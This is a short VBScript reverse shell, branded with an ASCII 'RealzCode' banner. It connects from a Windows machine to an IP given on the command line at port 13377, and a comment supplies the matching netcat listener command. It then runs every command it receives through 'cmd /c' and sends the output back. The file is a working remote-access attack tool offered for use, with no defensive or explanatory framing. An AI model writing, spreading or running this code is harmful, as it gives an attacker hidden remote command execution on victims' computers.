Dim asciiArt
asciiArt = "  _____            _      _____          _      " & vbCrLf _
        & " |  __ \          | |    / ____|        | |     " & vbCrLf _
        & " | |__) |___  __ _| |___| |     ___   __| | ___ " & vbCrLf _
        & " |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \" & vbCrLf _
        & " | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/" & vbCrLf _
        & " |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|"

Dim po
po = 13377 'nc -l -p 13377

Dim ip
If WScript.Arguments.Count > 0 Then
    ip = WScript.Arguments(0)
Else
    WScript.Echo "Please provide the IP address as a command-line argument."
    WScript.Quit 1
End If

Dim clientIP
Set oShell = CreateObject("WScript.Shell")
Set oExec = oShell.Exec("ipconfig")
Do Until oExec.StdOut.AtEndOfStream
    line = oExec.StdOut.ReadLine()
    If InStr(line, "IPv4 Address") > 0 Then
        parts = Split(line, ":")
        clientIP = Trim(parts(1))
        Exit Do
    End If
Loop

Dim sock
Set sock = CreateObject("MSWinsock.Winsock")
sock.Connect ip, po

If sock.LastError = 0 Then
    sock.SendData asciiArt & vbCrLf

    Do While sock.State = 7
        sock.SendData vbCrLf & "$ "
        Do Until sock.State = 7 Or sock.State = 0
            WScript.Sleep 100
        Loop
        If sock.State = 0 Then Exit Do

        cmd = sock.GetData
        If Trim(cmd) = "exit" Then
            sock.Close
            WScript.Quit
        Else
            Set shell = CreateObject("WScript.Shell")
            Set exec = shell.Exec("cmd /c " & cmd)
            output = exec.StdOut.ReadAll
            sock.SendData output
        End If
    Loop

    sock.Close
End If
